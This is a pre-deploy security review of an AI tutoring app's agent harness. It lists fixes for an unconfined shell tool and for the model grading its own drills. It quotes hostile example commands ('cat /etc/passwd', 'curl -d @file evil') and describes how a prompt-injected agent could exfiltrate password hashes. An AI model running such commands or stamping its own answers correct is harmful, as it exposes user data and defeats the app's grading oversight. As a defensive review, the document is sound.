# Pre-Deploy Devil's-Advocate Critique — Consolidated (2026-08-02)

Three read-only senior-engineer critics (UI/UX, backend+security, agent-harness) reviewed the
consolidated integration branch. Deploy target is a **private** Lightsail box (you + maybe a
friend), which lowers—but does not remove—the severity of the multi-tenant issues (prompt
injection via résumé/GitHub/web is a real vector even for one user).

## Verdict
Architecture is sound and several scary hypotheses were **disproved by live testing** (contextvar
per-user isolation holds; migrations are copy-verify-swap safe; the learner-code sandbox, argon2id
auth, secure cookies, and the sandboxed artifact iframe are done right). But there are a handful of
real **security/trust P0s** and a large **maintainability** debt (the frontend lives as a 2500-line
Python string).

## P0 — must fix before deploy
1. **`run_bash` is an unconfined host shell (cross-tenant / host breach).** `run_bash` (tools.py:401)
   is `subprocess.run(shell=True)` with full host FS + network, bypassing the tenant confinement that
   protects the deepagents file tools. And `is_safe_bash` (agent.py:61) auto-approves reads by *verb*
   only — `cat ~/.eklavya-data/users.db`, `cat /etc/passwd`, `curl -d @file evil` all auto-run with no
   prompt (verified). A prompt-injected agent can exfiltrate every user's password hash + host files.
   **Fix:** in DEPLOYED, disable `run_bash` (route execution through the isolated `sandbox.run_python`)
   OR jail it (bwrap/nsjail rooted at the tenant workspace, no network); and make `is_safe_bash`
   validate every path resolves inside the workspace (or drop auto-approve in DEPLOYED). (This is also
   task #49 — sandbox hardening — now a deploy-blocker.)
2. **Self-grading isn't enforced (core trust claim).** `record_attempt(correct=…)` is in `AGENT_TOOLS`
   (tools.py:949) with a model-supplied boolean → the model can stamp `correct=True` on a code drill
   with no sandbox. **Fix:** remove `record_attempt` from the agent surface; make the tamper-proof
   graders the only write path to ratings/attempts.
3. **The "frozen credibility benchmark" contaminates the ratings it measures.** ASSESSMENT mode calls
   `grade_and_record` → Elo + XP + streak (tools.py:962; prompts.py:759), and short-answer benchmark
   items are graded *by the tutor model itself* (prompts.py:762). **Fix:** assessment records only to
   `assessments`/`responses` (no Elo/XP/streak); route short-answer through deterministic graders.
4. **Reflected XSS on the login/signup pages (pre-auth).** `error`/`notice` from the query string are
   injected unescaped into the auth HTML (webapp.py:734). **Fix:** `html.escape()` both slots.
5. **Phantom kickoff on every page load** (webapp.py:2550) — silently starts a session on any load/
   deep-link, burning tokens and spawning junk chat threads (the source of your 3 deleted chats).
   **Fix:** only fire the kickoff on genuine first-run/arena landing.

## P1 — should fix
- **CDN hardening**: 6 CDN scripts (marked/dompurify/mermaid/highlight.js/Monaco), no SRI, one
  unpinned; offline/firewall breaks the editor + markdown. Vendor them (like Chart.js/three/KaTeX) or
  pin+SRI+graceful-degrade.
- **Reduced-motion** ignored on load (only the manual toggle works); read the OS media query at boot. (a11y)
- **Context/history budgeting**: no `trim_messages`/summarization; full growing history + ~49KB prompt
  every turn; unbounded `learning_prefs` block + checkpoint growth. Add windowing + caps + compaction.
- **Pin Starlette + add a concurrent 2-tenant streaming isolation regression test** (isolation works
  today but is version-fragile).
- **artifact_import**: folder-slug→pillar name mismatch (imported pillar won't match the grid), symlink
  escape (resolve+is_relative_to check), and full-tree rescan every turn (scan by mtime).
- **SymPy graders** run untrusted answers in-process (symbolic bomb DoS) — sandbox or cap them.
- **Rubric judge**: set temperature=0; when only one provider exists it silently self-judges — flag/withhold.
- **Keyboard a11y** on primary controls (`.seg`, pills, cards → button/tabindex+keydown).
- **`esc()` incomplete** (doesn't escape `'`/`&`) → library search + `&`-titles break.
- **`grade_and_record`** documents legacy axes + doesn't thread `subject` → non-coding code drills land
  on the coding grid.

## Simplify & modularize (both UI + backend flagged this as the #1 maintainability debt)
- **Extract the frontend out of Python.** `webapp.py` is 3372 lines; `_INDEX/_LOGIN/_LANDING/_ABOUT/
  _CANVAS` are ~2500 lines of inline HTML/CSS/JS. Move to `static/`+templates (auto-escaping), split
  the SPA JS/CSS into cacheable files. Biggest single win; also kills the XSS-prone string `.replace`.
- **Split routers** (FastAPI APIRouter): chat/artifacts/progress/account. `create_app()` just wires them.
- **Extract the `_events` agent-turn state machine** into a unit-testable `stream_turn()`.
- **Split `tools.py`** (962 lines) → state / grading / web; assemble AGENT_TOOLS from them.
- **Collapse the 4 recording tools → one `grade(answer_type=…)` dispatcher** (structurally closes the
  self-grade P0 — self-report only reachable for genuinely subjective types).
- **Centralize DEPLOYED policy** into one `policy.py` (posture is smeared across 5 files today).
- **Dedupe the design tokens** (declared 4×) into one `tokens.css`; collapse the 5 celebration overlays
  into one `toast()` helper; split `forest2d.js` into modules.
- **prompts.py** (~49KB, 775 lines) — compose per-mode from minimal blocks (BLITZ/ASSESSMENT don't need
  the Chart.js recipe); dedupe the OUTPUT rule (stated 3×). ~40% fewer tokens/turn.
- **Delete dead code**: `/canvas`+`_CANVAS`, `wireParallax`, `.tab[data-view]` wiring, `benchmark.py:397`
  and/or-ternary bug, `config.__getattr__` shims.

## Verified-good (keep)
contextvar isolation (load-tested), copy-verify-swap migrations, learner-code sandbox, argon2id +
HttpOnly/SameSite/Secure cookies, TRUST_PROXY-gated XFF, sandboxed `allow-scripts`-only artifact iframe,
DOMPurify on markdown, subjects registry + scoring maths.

## Test gaps to close
run_bash can't escape the tenant; concurrent 2-tenant contextvar; auth-page XSS; bare
`record_attempt(correct=True)` refused.
</content>
